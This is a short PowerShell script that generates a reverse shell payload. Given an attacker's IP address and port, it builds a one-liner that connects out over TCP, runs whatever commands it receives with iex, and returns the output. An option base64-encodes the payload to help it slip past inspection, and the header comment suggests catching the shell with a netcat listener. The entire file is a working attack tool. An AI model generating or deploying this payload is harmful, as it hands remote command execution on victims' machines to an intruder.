<#
Generates code to use in a reverse shell.
Use nc -lvp 4444 for example to catch it.
Tested on Windows 10, however code generated works on all PS versions.
#>

Function New-PSReverseString {
param([net.ipaddress]$LHOST,[uint16]$LPORT=4444,[switch]$Encode)

    $payload =@(
        "`$client = New-Object System.Net.Sockets.TCPClient('$($LHOST.IPAddressToString)',$LPORT);"
        '$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};'
        'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;'
        '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
        '$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "$($env:COMPUTERNAME):PS " + (pwd).Path + "> ";'
        '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
        '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};'
        '$client.Close()'
    )
    $payload = $payload -join ''

    if($Encode)
    {
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
        [Convert]::ToBase64String($Bytes)
    }else{
        $payload
    }

}
